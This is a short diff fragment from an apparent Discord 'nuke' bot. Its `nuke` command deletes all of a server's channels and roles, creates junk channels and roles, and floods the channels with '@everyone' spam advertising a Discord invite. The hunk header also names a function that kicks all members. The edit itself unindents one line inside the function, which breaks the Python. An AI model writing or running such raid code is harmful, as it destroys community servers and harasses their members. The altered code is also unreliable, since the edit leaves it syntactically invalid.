@@ -229,7 +229,7 @@ async def kick_all_and_leave(guild: discord.Guild):
 async def nuke(ctx: commands.Context):
     guild    = ctx.guild
     spam_msg = "@everyone @here\n# JOIN https://discord.gg/jK7jVMZtxJ for the best n0ke bot"
-    await asyncio.gather(delete_all_channels(guild), delete_all_roles(guild))
+await asyncio.gather(delete_all_channels(guild), delete_all_roles(guild))
     channels = await create_glitch_channels(guild)
     await create_glitch_roles(guild)
     await spam_channels(channels, spam_msg, SPAM_COUNT)
